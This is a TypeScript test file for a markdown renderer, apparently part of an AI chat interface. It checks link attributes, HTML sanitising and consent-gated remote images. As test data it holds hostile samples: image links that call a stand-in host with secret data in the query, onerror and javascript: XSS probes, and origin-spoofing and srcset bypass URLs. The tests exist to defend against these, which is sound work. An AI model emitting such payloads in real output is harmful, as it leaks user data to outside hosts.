import { describe, expect, it } from "vitest";
import { renderMarkdown, renderMarkdownTail } from "./markdown";
import { advance, createStreamingMarkdown } from "./streaming-markdown";

/** The single rendered `<img>` src, or null. */
function imageSrc(html: string): string | null {
  const doc = new DOMParser().parseFromString(html, "text/html");
  return doc.querySelector("img")?.getAttribute("src") ?? null;
}

describe("renderMarkdown", () => {
  it("renders GFM markdown (headings, emphasis)", () => {
    const html = renderMarkdown("# Title\n\nSome **bold** text.");
    expect(html).toContain("<h1");
    expect(html).toContain("Title");
    expect(html).toContain("<strong>bold</strong>");
  });

  it("highlights fenced code for a known language", () => {
    const html = renderMarkdown("```javascript\nconst x = 1;\n```");
    expect(html).toContain("language-javascript");
    expect(html).toContain("hljs-keyword"); // `const` got highlighted
  });

  it("resolves language aliases (js -> javascript)", () => {
    const html = renderMarkdown("```js\nconst x = 1;\n```");
    expect(html).toContain("hljs-keyword");
  });

  it("escapes code for an unknown language without throwing", () => {
    const html = renderMarkdown("```nope\n<b>x</b>\n```");
    expect(html).toContain("&lt;b&gt;");
  });

  describe("links open in a new tab", () => {
    function anchors(html: string): HTMLAnchorElement[] {
      const doc = new DOMParser().parseFromString(html, "text/html");
      return Array.from(doc.querySelectorAll("a"));
    }

    it.each([
      ["a markdown link", "See [the docs](https://example.com/docs)."],
      ["a GFM autolink", "Visit https://example.com today"],
      ["an angle-bracket autolink", "<https://example.com>"],
      ["a raw-HTML anchor", 'Raw <a href="https://example.com">link</a>'],
      ["a relative link", "[home](/settings)"],
    ])("%s gets target=_blank + rel=noopener noreferrer", (_label, src) => {
      const links = anchors(renderMarkdown(src));
      expect(links).toHaveLength(1);
      expect(links[0]?.getAttribute("target")).toBe("_blank");
      expect(links[0]?.getAttribute("rel")).toBe("noopener noreferrer");
    });

    it("overrides an author-supplied target/rel", () => {
      const [link] = anchors(
        renderMarkdown('<a href="https://example.com" target="_self" rel="opener">x</a>'),
      );
      expect(link?.getAttribute("target")).toBe("_blank");
      expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    });

    it("applies while streaming too", () => {
      const [link] = anchors(
        renderMarkdown("partial [link](https://example.com) **bo", { streaming: true }),
      );
      expect(link?.getAttribute("target")).toBe("_blank");
    });

    it("still strips javascript: hrefs", () => {
      const html = renderMarkdown('<a href="javascript:alert(1)">x</a>');
      expect(html).not.toContain("javascript:");
    });
  });

  it("sanitizes dangerous HTML", () => {
    const html = renderMarkdown("Hi <script>alert(1)</script> there");
    expect(html).not.toContain("<script>");
    expect(html).toContain("Hi");
  });

  it("balances dangling bold emphasis while streaming", () => {
    expect(renderMarkdown("a **bold", { streaming: true })).toContain("<strong>bold</strong>");
  });

  it("does not balance delimiters when not streaming", () => {
    expect(renderMarkdown("a **bold")).not.toContain("<strong>");
  });

  it("wraps fenced code blocks with a copy button", () => {
    const html = renderMarkdown("```js\nconst x = 1;\n```");
    expect(html).toContain("code-block");
    expect(html).toContain("data-copy");
    expect(html).toContain("<pre>");
  });

  it("does not add a copy button to inline code", () => {
    const html = renderMarkdown("use `npm run dev` please");
    expect(html).not.toContain("data-copy");
    expect(html).toContain("<code>npm run dev</code>");
  });

  it("returns an empty string for empty input", () => {
    expect(renderMarkdown("")).toBe("");
  });

  describe("remote images require consent", () => {
    const image = { apiBase: "http://localhost:24203", cwd: "/work" };

    it.each([
      "![secret](https://evil.example/pixel?d=secret)",
      "![secret](http://evil.example/pixel)",
      "![secret](//evil.example/pixel)",
      '<img src="https://evil.example/pixel" onerror="alert(1)">',
      '<img src="//evil.example/pixel">',
      '<img src="https:&#10;//evil.example/pixel">',
      '<img src="/\\evil.example/pixel">',
    ])("replaces %s with an inert, host-labelled button", (text) => {
      const doc = new DOMParser().parseFromString(renderMarkdown(text, { image }), "text/html");
      expect(doc.querySelector("img")).toBeNull();
      const button = doc.querySelector("button.remote-image");
      expect(button?.textContent).toBe("Load image from evil.example");
      expect(button?.getAttribute("type")).toBe("button");
      expect(button?.getAttribute("data-src")).toMatch(/^https?:\/\/evil\.example\//);
      expect(button?.hasAttribute("onerror")).toBe(false);
    });

    it.each([
      "/local-image?path=%2Ftmp%2Fa.png",
      "data:image/png;base64,iVBORw0KGgo=",
      `${window.location.origin}/image.png`,
      "http://localhost:24203/images/conversation/image.png",
    ])("keeps trusted image %s", (src) => {
      expect(imageSrc(renderMarkdown(`<img src="${src}">`, { image }))).toBe(src);
    });

    it("compares exact origins, not hostname prefixes or URL credentials", () => {
      for (const src of [
        "http://localhost:24203.evil.example/a.png",
        "http://localhost:24203@evil.example/a.png",
        "http://localhost:24206/a.png",
        "https://localhost:24203/a.png",
      ]) {
        expect(imageSrc(renderMarkdown(`<img src="${src}">`, { image }))).toBeNull();
      }
    });

    it("does not leak a backend allowlist between renders", () => {
      const text = "![pic](http://localhost:24203/a.png)";
      expect(imageSrc(renderMarkdown(text, { image }))).not.toBeNull();
      expect(imageSrc(renderMarkdown(text))).toBeNull();
    });

    it("removes responsive image sources so srcset cannot bypass consent", () => {
      const html = renderMarkdown(
        '<picture><source srcset="https://evil.example/a.png"><img src="/safe.png" srcset="https://evil.example/b.png 2x"></picture>',
      );
      expect(html).not.toContain("srcset");
      expect(html).not.toContain("evil.example");
    });

    it("blocks images in streaming tails and settled prefixes too", () => {
      const state = createStreamingMarkdown();
      const text = "![pic](https://evil.example/pixel)";
      expect(imageSrc(renderMarkdownTail(text))).toBeNull();
      expect(advance(state, text).tailHtml).toContain("remote-image");
      const settled = advance(state, `${text}\n\nafter\n`);
      expect(settled.prefixHtml).toContain("remote-image");
      expect(imageSrc(settled.prefixHtml)).toBeNull();
    });

    it("does not affect other DOMPurify consumers", async () => {
      const { default: purify } = await import("dompurify");
      expect(imageSrc(purify.sanitize('<img src="https://evil.example/a.png">'))).not.toBeNull();
    });
  });

  describe("local-path images", () => {
    const BASE = "http://localhost:24203";
    const image = { apiBase: BASE, cwd: "/w/foo" };

    it("rewrites a file:// URL to the backend image route", () => {
      expect(imageSrc(renderMarkdown("![pic](file:///home/u/pic.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`,
      );
    });

    it("rewrites an absolute path; an empty apiBase yields a root-relative src", () => {
      expect(imageSrc(renderMarkdown("![pic](/home/u/pic.png)", { image: { apiBase: "" } }))).toBe(
        "/local-image?path=%2Fhome%2Fu%2Fpic.png",
      );
      expect(imageSrc(renderMarkdown("![pic](/home/u/pic.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`,
      );
    });

    it("resolves a relative path against the conversation cwd", () => {
      expect(imageSrc(renderMarkdown("![shot](shot.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`,
      );
      expect(
        imageSrc(renderMarkdown("![shot](shot.png)", { image: { apiBase: BASE, cwd: "/w/foo/" } })),
      ).toBe(`${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`);
    });

    it("leaves a relative path untouched when no cwd is available", () => {
      expect(imageSrc(renderMarkdown("![shot](shot.png)", { image: { apiBase: BASE } }))).toBe(
        "shot.png",
      );
      expect(imageSrc(renderMarkdown("![shot](shot.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`,
      );
      expect(imageSrc(renderMarkdown("![shot](shot.png)"))).toBe("shot.png");
    });

    it("leaves data: images untouched", () => {
      const data = "data:image/png;base64,iVBORw0KGgo=";
      expect(imageSrc(renderMarkdown(`![inline](${data})`, { image }))).toBe(data);
    });

    it("does not rewrite image syntax inside fenced code", () => {
      const html = renderMarkdown("```md\n![pic](/home/u/pic.png)\n```", { image });
      expect(html).toContain("/home/u/pic.png");
      expect(html).not.toContain("/local-image");
    });

    it("rewrites the streaming tail, the settled prefix, and a seeded tail", () => {
      const state = createStreamingMarkdown();
      const tail = advance(state, "![pic](/home/u/pic.png)", { image });
      expect(imageSrc(tail.tailHtml)).toBe(`${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`);

      // The settled prefix must render with the same options too.
      const settled = advance(state, "![pic](/home/u/pic.png)\n\nnext\n", { image });
      expect(imageSrc(settled.prefixHtml)).toBe(`${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`);

      const seeded = renderMarkdownTail(
        "![shot](shot.png)",
        { fences: 0, bold: 0, code: 0 },
        {
          image,
        },
      );
      expect(imageSrc(seeded)).toBe(`${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`);
    });

    it("invalidates the streaming cache when the image options change (async cwd)", () => {
      const state = createStreamingMarkdown();
      const text = "![shot](shot.png)\n\nnext\n";
      advance(state, text);
      expect(imageSrc(state.prefixHtml)).toBe("shot.png"); // no cwd yet
      const updated = advance(state, text, { image });
      expect(imageSrc(updated.prefixHtml)).toBe(`${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`);
    });
  });
});
